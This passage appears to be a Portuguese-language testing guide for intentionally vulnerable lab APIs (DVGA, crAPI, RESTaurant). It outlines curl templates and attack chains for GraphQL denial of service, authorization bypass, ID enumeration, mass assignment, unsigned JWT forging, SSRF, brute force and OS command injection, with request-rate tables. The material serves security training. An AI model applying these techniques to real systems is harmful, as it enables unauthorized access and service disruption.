...
Todas as interações com o DVGA usam um único endpoint (`/dvga/graphql`) com requisições POST contendo payloads JSON `{"query":"..."}`.
...
| Operação | Tipo | Autenticação | Propósito |
|---|---|---|---|
...
| `systemDiagnostics(cmd)` | Query | admin/password | Executar comandos OS na whitelist |
...
**Query com Alto Consumo de Recursos (resposta de ~82 segundos):**
```bash
curl -X POST ${ORIGIN}/dvga/graphql \
  -H "Content-Type: application/json" \
...
**Ataque Baseado em Aliases (1000 operações com alias):**
```bash
curl -X POST ${ORIGIN}/dvga/graphql \
  -H "Content-Type: application/json" \
...
**Injeção de Log (spoofing de nome de operação):**
```bash
curl -X POST ${ORIGIN}/dvga/graphql \
  -H "Content-Type: application/json" \
...
**Excluir item do menu como Customer (deveria exigir Employee+):**
```bash
...
```bash
# Primeiro escale para Employee via BOPLA, então:
...
# Navegue até ${CRAPI}/mailhog/ ou use a API do MailHog:
...
| `/community/api/v2/community/posts` | POST | Sim | Criar post no blog |
...
```bash
# Obter UUID do seu veículo primeiro
...
```bash
# Enumeração de ID sequencial — nenhum token necessário
for i in 1 2 3 4 5; do
  echo "Report $i:"
...
```bash
# Fazer upload de um vídeo, então inspecionar a resposta
...
```bash
# Alterar GET para PUT, modificar status e quantity
...
# 3. Unir com pontos, deixar assinatura vazia: <header>.<payload>.
...
| **API4: Consumo de Recursos** | DoS por lote, recursão, alias, duplicação de campos | Enumeração de usuários via tamanho da resposta | DoS via `contact_mechanic` repeat_request |
| **API5: BFLA** | — | `DELETE /menu`, `PUT /users/update_role` | `DELETE /admin/videos` como usuário comum |
| **API6: Atribuição em Massa** | — | `PUT /orders` (status, quantity) | Status/quantidade de pedidos, video conversion_params |
...
**Teste de bypass de autenticação:** Forjar tokens JWT, força bruta de OTPs, usar versões depreciadas da API, confusão de algoritmo.

**Teste de SSRF:** URLs internos em parâmetros `importPaste`, `image_url` e `mechanic_api`.
...
1. **Cadeia de escalação do RESTaurant:** Registrar → Token → PATCH de papel para Chef → Reautenticar → Injeção de comando
2. **Fluxo completo do crAPI:** Cadastro → Verificar e-mail (MailHog) → Login → Adicionar veículo → Contatar mecânico (SSRF) → Manipulação de pedido
3. **Reconhecimento até exploração do DVGA:** Introspecção → Descobrir systemDiagnostics → Força bruta de credenciais admin → Execução de comando OS

### Recomendações de Taxa

| Padrão | Requisições/seg | Duração | Observações |
|---|---|---|---|
| Linha de base (por app) | 10-50 | 5 min | Estabelecer fingerprint de tráfego normal |
...
| DoS GraphQL | 10-50 | 30 seg | Cada requisição é custosa no servidor |
| Fuzzing de injeção | 50-200 | 5 min | Variar payloads por requisição |
| Sondagem SSRF | 5-20 | 2 min | Lento; cada um dispara requisição HTTP no servidor |
